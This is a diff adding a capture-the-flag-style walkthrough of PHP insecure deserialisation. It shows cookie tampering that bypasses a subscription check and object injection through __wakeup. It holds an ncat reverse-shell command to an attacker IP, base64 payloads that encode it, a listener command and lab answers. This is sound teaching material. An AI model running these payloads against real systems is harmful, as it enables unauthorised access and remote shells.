@@ -143,5 +143,271 @@ $note = new Notes("Welcome to THM");
 $serialized_note = serialize($note);
 ```
 
+## Exploitation - Update Properties
+
+### Updating Properties of an Object
+
+In this task, we'll explore a practical example in PHP, using a simple note-sharing application as our case study. Our note-sharing application allows users to create, save, and share notes easily. Users can input their notes into the application, which are then saved for future reference. Additionally, users can share their notes with others, facilitating collaboration and information exchange. The application also includes subscription-based features, ensuring only subscribed users can access certain functionalities such as note sharing.
+
+You can access the website by visiting the link `http://<MACHINE_IP>/case1`.
+
+<img width="284" height="239" alt="image" src="https://github.com/user-attachments/assets/945a1160-f4bf-4f37-bebf-a8657b5f6ba3" />
+
+**Defining the Notes Class**
+
+The application has a `Notes` class, representing a note in our application. This class has three private properties: `user`, `role`, and `isSubscribed`. We also have setter and getter methods to manipulate the `isSubscribed` property.
+
+```
+class Notes {
+
+    private $user;
+    private $role;
+    private $isSubscribed;
+
+    public function __construct($user, $role, $isSubscribed) {
+        $this->user = $user;
+        $this->role = $role;
+        $this->isSubscribed = $isSubscribed;
+    }
+
+    public function setIsSubscribed($isSubscribed) {
+        $this->isSubscribed = $isSubscribed;
+    }
+
+    public function getIsSubscribed() {
+        return $this->isSubscribed;
+ }
+}
+```
+
+**Storing User Data in Cookies**
+
+When a user visits our application for the first time, it sets a serialised cookie containing their user data. This includes their user name, role, and subscription status (`isSubscribed`). If the user is a paid member (`isSubscribed = true`), they are allowed to share notes.
+
+<img width="602" height="108" alt="image" src="https://github.com/user-attachments/assets/fce839d7-ee06-48c0-926c-a7d42ca8dde1" />
+
+**Exploiting the Vulnerability**
+
+In this step, we'll illustrate how an attacker can exploit the vulnerability by modifying the serialised cookie value to gain unauthorised access to share notes.
+
+- **Serialised cookie**: After decoding the base64-encoded cookie value, we obtain the following serialised representation of the Notes object.
+
+You can decode the cookie from any only Base64 Decoder, I used [Base64 Decode and Encode](https://www.base64decode.org/)
+
+`O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}`
+
+PHP adds special characters to non-public property names to avoid confusion when different classes have properties with the same name.
+
+Suppose we have this PHP class:
+
+```
+class User {
+    public $name = "Ali";
+    private $password = "123";
+}
+```
+
+When PHP serializes this object, the result looks something like this: `O:4:"User":2:{s:4:"name";s:3:"Ali";s:14:"Userpassword";s:3:"123";}`
+
+The important part is the property names:
+- Public property: `name` — stored normally.
+- Private property: `\0User\0password` — contains the class name User, surrounded by null bytes (`\0`).
+- Protected property: `\0*\0password` — uses `*` instead of the class name.
+
+When an object is serialised, PHP stores the object's properties and class name. This ensures that when the object is later deserialised, PHP knows which class to instantiate and how to assign the serialised data to the object's properties correctly. Let's break down the serialised note into its components:
+
+- `O:5:"Notes":3`: This represents an object (`O`) with the class name `Notes`, which has three properties.
+- `s:4:"user";s:5:"guest"`: This indicates a string (`s`) with a length of 4 characters, representing the property user with the value "guest".
+- `s:4:"role";s:5:"guest"`: Similar to the previous one, it represents the property role with the value "guest".
+- `s:12:"isSubscribed";b:0`: This represents a boolean (`b`) property named isSubscribed with the value of false (`0`).
+
+---
+
+### Exploiting the Vulnerability
+
+In the current scenario, when the user would like to try to share the note, they get the following pop-up:
+
+<img width="272" height="242" alt="image" src="https://github.com/user-attachments/assets/e7ea57c8-c7e9-46b5-8de7-3adcb5487652" />
+
+
+The backend PHP code validates the incoming cookie, deserialises it, and then validates whether the user is subscribed. Our main task is to bypass that.
+
+Suppose an attacker intercepts this serialised cookie value and modifies the `isSubscribed` property from false (`0`) to true (`1`). The attacker can manipulate the subscription status without legitimate authorisation by changing the boolean value in the serialised data.
+
+So we will first change the value from `0` to `1` in the serialised cookie: `O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:1;}`
+
+Then encoding it into base64 format: `Tzo1OiJOb3RlcyI6Mzp7czo0OiJ1c2VyIjtzOjU6Imd1ZXN0IjtzOjQ6InJvbGUiO3M6NToiZ3Vlc3QiO3M6MTI6ImlzU3Vic2NyaWJlZCI7YjoxO30=`
+
+You can use any base64 encode tool or online website, I used [Base64 Encode and Decode](https://www.base64encode.org/)
+
+Then double click the cookie of website and paste your modified cookie.
+
+<img width="379" height="68" alt="image" src="https://github.com/user-attachments/assets/7cb67973-1f4e-422b-a570-9fffb1e45c08" />
+
+Without reloading the page, click the share button and you get the flag.
+
+---
+
+### Answer the questions below
+
+1. What is the flag value after sharing a note with a valid subscription?
+
+<img width="535" height="268" alt="image" src="https://github.com/user-attachments/assets/a011ff1f-f126-4a06-8e3b-accc2b9ac93d" />
+
+2. What is the default role value once the user loads the notes application?
+
+`guest`
+
+## Exploitation - Object Injection
+
+Object injection is a vulnerability that arises from insecure data deserialisation in web applications. It occurs when untrusted data is deserialised into an object, allowing attackers to manipulate the serialised data to execute arbitrary code, leading to serious security risks. 
+
+In this task, we'll explore how object injection works and demonstrate its impact through a simple PHP code snippet. 
+
+As we know, the vulnerability arises from the process of serialisation and deserialisation, which allows PHP objects to be converted into a storable format (serialisation) and reconstructed back into objects (deserialisation). While serialisation and deserialisation are useful for data storage and transmission, they can also introduce security risks if not properly implemented.
+
+To exploit a PHP Object Injection vulnerability, the application should include a class featuring a PHP magic method (like `__wakeup` or `__sleep`) that can be exploited for malicious purposes. All classes involved in the attack should be declared before calling the `unserialize()` method (unless object autoloading is supported).
+
+**Example**
+
+Let's consider an index.php code snippet that shows the serialisation and deserialisation using the `serialize()` and `unserialize()` functions. The code accepts `GET` parameter `decode` or `encode` and converts the user-provided value accordingly.
+
+```
+<?php
+class UserData {
+    private $data;
+    public function __construct($data) {
+        $this->data = $data;
+    }
+..
+require 'test.php';
+if(isset($_GET['encode'])) {
+    $userData = new UserData($_GET['encode']);
+    $serializedData = serialize($userData);
+    $base64EncodedData = base64_encode($serializedData);
+    echo "Normal Data: " . $_GET['encode'] . "<br>";
+    echo "Serialized Data: " . $serializedData . "<br>";
+    echo "Base64 Encoded Data: " . $base64EncodedData;
+
+} elseif(isset($_GET['decode'])) {
+    $base64EncodedData = $_GET['decode'];
+    $serializedData = base64_decode($base64EncodedData);
+    $test = unserialize($serializedData);
+    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
+    echo "Serialized Data: " . $serializedData;
+
+...
+```
+
+<img width="785" height="139" alt="image" src="https://github.com/user-attachments/assets/5f6c625b-557f-4701-a04f-febcfc5a8f08" />
+
+For example, if we send the input `hellothm` via the URL `http://<MACHINE_IP>/case2/?encode=hellothm`, we will get the following output:
+
+<img width="685" height="215" alt="image" src="https://github.com/user-attachments/assets/df4c1014-eedb-406b-866a-8b4c778a1e38" />
+
+We see that there is a base64 encoded string above `TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozODoibmNhdCAtbnYgMTAuMTAuMTkwLjIxNyA0NDQ0IC1lIC9iaW4vc2giO30=`, we will decode this from the URL:
+
+<img width="687" height="242" alt="image" src="https://github.com/user-attachments/assets/78bac952-d6dd-464f-b652-31f45e14313b" />
+
+We get to know that there is a class named as `MaliciousUserData`, most probably saved as `test.php`
+
+```
+<?php
+class MaliciousUserData {
+public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
+    
+    public function __wakeup() { 
+    exec($this->command);
+...
+
+?>
+```
+
+In the above code, through insecure deserialisation, it's possible to manipulate the properties of an object, including altering the `command` property of the `MaliciousUserData` class in the above code. This can be achieved by crafting a specially crafted serialised string that contains the desired property values. 
+
+For instance, if we want to modify the `command` property to execute a different command or connect to a different server, we can serialise an object with the desired property value and then inject it into the vulnerable `unserialize()` function. This way, upon deserialisation, the manipulated property value will be loaded into the object.
+
+What stays the same: You cannot change the code or instructions inside the `__wakeup()` function itself. That function is locked into the original application code.
+
+What you can change: You can change the data or variables (like a `command` string) that the function uses when it runs.
+
+---
+
+### Preparing the Payload
+
+As discussed earlier, calling another class is a normal feature in PHP, and you can view the code of that file if the target website is using open-source code. 
+
+The code in `index.php` blindly unserialises the input without performing any sanitisation. What is the option here? What if we modify the class `MaliciousUserData` and modify its `command` attribute such that when the `__wakeup` function is called, it will be called with the attacker-provided value?
+
+Let's create some PHP code on our AttackBox that generates malicious serialised user data.
+
+```
+<?php
+class MaliciousUserData {
+public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
+}
+
+$maliciousUserData = new MaliciousUserData();
+$serializedData = serialize($maliciousUserData);
+$base64EncodedData = base64_encode($serializedData);
+echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
+?>
+```
+
+In the above code, the `_wakeup()` function of `MaliciousUserData` class (`test.php`) will execute a reverse shell command using Ncat to connect to the specified IP address (`ATTACK_TUN0_IP`) and port (`4444`) with the `-e` flag to execute `/bin/sh` as a shell.
+
+Once you create the file named `index.php`, execute it through `php index.php` through the terminal. This will return a base64-encoded serialised object of the `MaliciousUserData` class.
+
+The generated base64 encoded string would look like this: `TzoxNzoiTWFsaWNp[Redacted]`. 
+
+<img width="790" height="27" alt="image" src="https://github.com/user-attachments/assets/ed9b9ea1-53fc-4410-b8cb-ccd2fe351f8f" />
+
+Base64 Encoded Serialized Data: `TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czo0MDoibmNhdCAtbnYgMTkyLjE2OC4xNzYuMTc4IDQ0NDQgLWUgL2Jpbi9zaCI7fQ==`
+
+Start the Netcat listener on port 4444 using the command `nc -nvlp 4444` on the AttackBox.
+
+<img width="166" height="40" alt="image" src="https://github.com/user-attachments/assets/be41014c-f540-4c08-ac43-10f8b10a0055" />
+
+Now, it's time to exploit the insecure deserialisation by decoding the shellcode by visiting the URL `http://<MACHINE_IP>/case2/?decode=[SHELLCODE]` without generating the shellcode. Paste the Encoded Serialized Data in the URL and press enter.
+
+Once you visit the URL, the `index.php` file's deserialise function will deserialise the string and execute the `__wakeup()` function, leading to a remote shell. 
+
+<img width="682" height="211" alt="image" src="https://github.com/user-attachments/assets/56ee2e16-e23a-47e9-b182-088324b38062" />
+
+---
+
+### Answer the questions below
+
+1. What is the flag value after getting the reverse shell?
+
+<img width="697" height="271" alt="image" src="https://github.com/user-attachments/assets/704637ab-7d86-41bc-9623-6cf0547f0874" />
+
+2. What is the output of the whoami command after getting the shell?
+
+`www-data`
+
+<img width="67" height="38" alt="image" src="https://github.com/user-attachments/assets/45ca25e7-b714-4f78-ad80-e6ad71d399ec" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
